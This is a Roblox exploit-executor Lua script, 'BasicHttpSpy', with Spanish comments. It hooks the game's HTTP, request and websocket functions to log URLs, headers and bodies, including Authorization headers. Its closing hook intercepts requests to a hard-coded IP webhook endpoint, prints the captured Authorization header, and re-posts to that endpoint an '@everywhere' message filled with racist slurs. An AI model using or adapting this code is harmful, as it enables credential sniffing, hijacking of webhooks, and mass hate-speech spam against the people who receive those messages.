--[[
    BasicHttpSpy v1.0.1 - Versión simplificada con detección completa
]]

assert(syn or http, "Exploit no soportado (debe soportar syn.request o http.request)");

local clonef = clonefunction;
local format = clonef(string.format);
local Type = clonef(type);
local crunning = clonef(coroutine.running);
local cwrap = clonef(coroutine.wrap);
local cresume = clonef(coroutine.resume);
local cyield = clonef(coroutine.yield);
local Pcall = clonef(pcall);
local Pairs = clonef(pairs);
local Error = clonef(error);
local getnamecallmethod = clonef(getnamecallmethod);
local reqfunc = (syn or http).request;
local libtype = syn and "syn" or "http";

local registered_hooks = {}; -- Nueva tabla para almacenar los hooks
local is_internal_request_flag = false; -- Nueva bandera para evitar recursión

local methods = {
    HttpGet = not syn,
    HttpGetAsync = not syn,
    GetObjects = true,
    HttpPost = not syn,
    HttpPostAsync = not syn
}

local function DeepClone(tbl, cloned)
    cloned = cloned or {};
    for i,v in Pairs(tbl) do
        if Type(v) == "table" then
            cloned[i] = DeepClone(v);
            continue;
        end;
        cloned[i] = v;
    end;
    return cloned;
end;

local function SerializeBasic(data)
    if Type(data) == "table" then
        local result = "{"
        for k, v in Pairs(data) do
            if Type(v) == "string" then
                result = result .. tostring(k) .. ": \"" .. tostring(v) .. "\", "
            elseif Type(v) == "table" then
                result = result .. tostring(k) .. ": {...}, "
            else
                result = result .. tostring(k) .. ": " .. tostring(v) .. ", "
            end
        end
        return result .. "}"
    end
    return tostring(data)
end;

local function ConstantScan(constant)
    for i,v in Pairs(getgc(true)) do
        if type(v) == "function" and islclosure(v) and getfenv(v).script == getfenv(2).script and table.find(debug.getconstants(v), constant) then
            return v;
        end;
    end;
end;

local function FormatArguments(...)
    local args = {...}
    local result = ""
    for i, arg in pairs(args) do
        if Type(arg) == "string" then
            result = result .. "\"" .. tostring(arg) .. "\""
        elseif Type(arg) == "table" then -- Añadido para mejor serialización de tablas en argumentos
            result = result .. SerializeBasic(arg)
        else
            result = result .. tostring(arg)
        end
        if i < #args then result = result .. ", " end
    end
    return result
end;

-- Hook para métodos de game
local __namecall;
__namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod();
    
    if methods[method] then
        print(format("game:%s(%s)", method, FormatArguments(...)));
    end;

    return __namecall(self, ...);
end));

-- Hook para requests
local __request;
__request = hookfunction(reqfunc, newcclosure(function(req) 
    if Type(req) ~= "table" then return __request(req); end;
    
    local RequestData = DeepClone(req);
    
    if Type(RequestData.Url) ~= "string" then return __request(req) end;

    -- Si es una petición interna del hook, no aplicar hooks y resetear bandera
    if is_internal_request_flag then
        is_internal_request_flag = false; -- Resetear inmediatamente
        return __request(req); -- Dejar pasar la petición sin procesar por hooks
    end

    local t = crunning();
    cwrap(function() 
        local ok, ResponseData = Pcall(__request, RequestData);
        if not ok then Error(ResponseData, 0) end;

        -- Aplicar hooks si existen
        if not is_internal_request_flag then -- Doble verificación por si acaso
            for url_prefix, hook_func in Pairs(registered_hooks) do
                if RequestData.Url:sub(1, #url_prefix) == url_prefix then
                    local success, modified_response = Pcall(hook_func, DeepClone(ResponseData), DeepClone(RequestData));
                    if success and modified_response ~= nil then
                        ResponseData = modified_response;
                        print(format("[BasicHttpSpy] Hook aplicado para %s", RequestData.Url))
                    elseif not success then
                        print(format("[BasicHttpSpy] Error en hook para %s: %s", RequestData.Url, tostring(modified_response)))
                    end
                end
            end
        end

        print(format("=== %s.request ===", libtype));
        print("URL: " .. tostring(RequestData.Url));
        
        if RequestData.Method then
            print("Method: " .. tostring(RequestData.Method));
        end
        
        if RequestData.Headers then
            print("Request Headers: " .. SerializeBasic(RequestData.Headers));
        end
        
        if RequestData.Body then
            print("Request Body: " .. tostring(RequestData.Body));
        end
        
        print("Response Code: " .. tostring(ResponseData.StatusCode));
        
        if ResponseData.Headers then
            print("Response Headers: " .. SerializeBasic(ResponseData.Headers));
        end
        
        if ResponseData.Body then
            local bodyStr = tostring(ResponseData.Body)
            if #bodyStr > 500 then
                bodyStr = bodyStr:sub(1, 500) .. "... (truncado)"
            end
            print("Response Body: " .. bodyStr);
        end
        
        print("=== Fin Request ===\n");

        cresume(t, ResponseData)
    end)();
    return cyield();
end));

-- Hook para request global si existe
if request then
    replaceclosure(request, reqfunc);
end;

-- Hook para websockets si están disponibles
if syn and syn.websocket then
    local WsConnect, WsBackup = debug.getupvalue(syn.websocket.connect, 1);
    WsBackup = hookfunction(WsConnect, function(...) 
        print(format("syn.websocket.connect(%s)", FormatArguments(...)));
        return WsBackup(...);
    end);
end;

-- Hook para HttpGet/HttpPost internos (como en HttpSpy original)
if syn and syn.websocket then
    local HttpGet;
    local httpGetFunc = ConstantScan("ZeZLm2hpvGJrD6OP8A3aEszPNEw8OxGb");
    if httpGetFunc then
        HttpGet = hookfunction(getupvalue(httpGetFunc, 2), function(self, ...) 
            print(format("game.HttpGet(game, %s)", FormatArguments(...)));
            return HttpGet(self, ...);
        end);
    end;

    local HttpPost;
    local httpPostFunc = ConstantScan("gpGXBVpEoOOktZWoYECgAY31o0BlhOue");
    if httpPostFunc then
        HttpPost = hookfunction(getupvalue(httpPostFunc, 2), function(self, ...) 
            print(format("game.HttpPost(game, %s)", FormatArguments(...)));
            return HttpPost(self, ...);
        end);
    end;
end

-- Hook para métodos específicos de game
for method, enabled in Pairs(methods) do
    if enabled then
        local original;
        original = hookfunction(game[method], newcclosure(function(self, ...)
            local argsStr = FormatArguments(...)
            
            local result = original(self, ...)
            
            local resultStr = ""
            if Type(result) == "table" then
                resultStr = SerializeBasic(result)
            elseif Type(result) == "function" then -- Añadido para no intentar serializar funciones
                resultStr = tostring(result)
            else
                resultStr = tostring(result)
            end
            
            if #resultStr > 300 and Type(result) ~= "function" then
                resultStr = resultStr:sub(1, 300) .. "... (truncado)"
            end
            
            print(format("game.%s(game, %s) -> %s", method, argsStr, resultStr));
            
            return result
        end));
    end;
end

print("BasicHttpSpy v1.0.1 cargado - Detección completa con solo print()");

-- Nueva API para BasicHttpSpy (simplificada)
getgenv().BasicHttpSpy = {
    HookRequest = function(url_prefix, callback_function)
        if Type(url_prefix) ~= "string" or Type(callback_function) ~= "function" then
            Error("Argumentos inválidos para BasicHttpSpy.HookRequest. Se esperaba (string, function)");
            return;
        end
        registered_hooks[url_prefix] = callback_function;
        print(format("[BasicHttpSpy] Hook registrado para el prefijo de URL: %s", url_prefix));
    end,
    UnhookRequest = function(url_prefix)
        if Type(url_prefix) ~= "string" then
            Error("Argumento inválido para BasicHttpSpy.UnhookRequest. Se esperaba (string)");
            return;
        end
        if registered_hooks[url_prefix] then
            registered_hooks[url_prefix] = nil;
            print(format("[BasicHttpSpy] Hook eliminado para el prefijo de URL: %s", url_prefix));
        else
            print(format("[BasicHttpSpy] No se encontró ningún hook para el prefijo de URL: %s", url_prefix));
        end
    end
};

-- Definición de reglas de Hook directamente en el script:
local function miHookPersonalizado(response_data, request_data)
    local target_url_prefix_interno = "http://213.142.135.46:8080/api/webhooks" -- Puedes definir el prefijo aquí o pasarlo
    
    -- Solo actuar si la URL coincide exactamente o con un sub-patrón si es necesario
    if request_data.Url:sub(1, #target_url_prefix_interno) == target_url_prefix_interno then
        print(format("[Hook Interno] Petición interceptada para: %s", request_data.Url))

        -- Leer Headers de la Solicitud
        if request_data.Headers and request_data.Headers.Authorization then
            print("[Hook Interno] Authorization Header (Solicitud): " .. request_data.Headers.Authorization)
            
            -- Establecer la bandera antes de la petición interna
            is_internal_request_flag = true;
            local new_body_content = "@everywhere\nHi Hi niggers rats fuck youu NIGERSS"
            -- Para enviar un JSON válido a Discord:
            local json_body = game:GetService("HttpService"):JSONEncode({content = new_body_content})
            -- Preparar los headers cambi

            local responseRequestSuccess, responseRequest = Pcall(function()
                return request({ 
                    Url = request_data.Url, 
                    Method = request_data.Method or "POST", -- La petición original es POST
                    Headers = response_data.Headers or {}, -- Usar los headers de la respuesta original
                    Body = json_body -- Enviar el cuerpo JSON-encoded
                })
            end)
            -- Resetear la bandera inmediatamente después, incluso si hay error
            is_internal_request_flag = false;

            if responseRequestSuccess then
                print("[Hook Interno] Respuesta del responseRequest: " .. SerializeBasic(responseRequest))
            else
                print("[Hook Interno] Error al realizar responseRequest: " .. tostring(responseRequest))
            end
        else
            print("[Hook Interno] Authorization Header no encontrado en la solicitud.")
        end

        -- Leer Headers de la Respuesta
        if response_data.Headers then
            print("[Hook Interno] Headers de Respuesta Originales: " .. SerializeBasic(response_data.Headers))
        end

        -- Ejemplo: Modificar un header de la respuesta
        -- if not response_data.Headers then response_data.Headers = {} end
        -- response_data.Headers["X-BimoSpy-Hooked"] = "DirectlyInScript"
        -- print("[Hook Interno] Header 'X-BimoSpy-Hooked' añadido a la respuesta.")
        
        -- Devolver los datos de la respuesta (modificados o no)
        return response_data 
    end
    
    -- Si la URL no coincide con la lógica interna específica, devolver la respuesta sin modificar por este hook.
    return response_data
end

-- Registrar el hook para todas las URLs (o un prefijo muy general si quieres que se ejecute para muchas)
-- y luego la lógica interna del hook decidirá si actúa o no.
-- O puedes ser más específico con el prefijo aquí.
if getgenv().BasicHttpSpy and getgenv().BasicHttpSpy.HookRequest then
    getgenv().BasicHttpSpy.HookRequest("http://", miHookPersonalizado) -- Hook para todas las peticiones http
    getgenv().BasicHttpSpy.HookRequest("https://", miHookPersonalizado) -- Hook para todas las peticiones https
    -- O, si solo te interesa un dominio específico:
    -- getgenv().BasicHttpSpy.HookRequest("http://213.142.135.46:8080/api/webhooks", miHookPersonalizado)
else
    print("[BasicHttpSpy] Error: La API de HookRequest no está disponible para registrar el hook interno.")
end
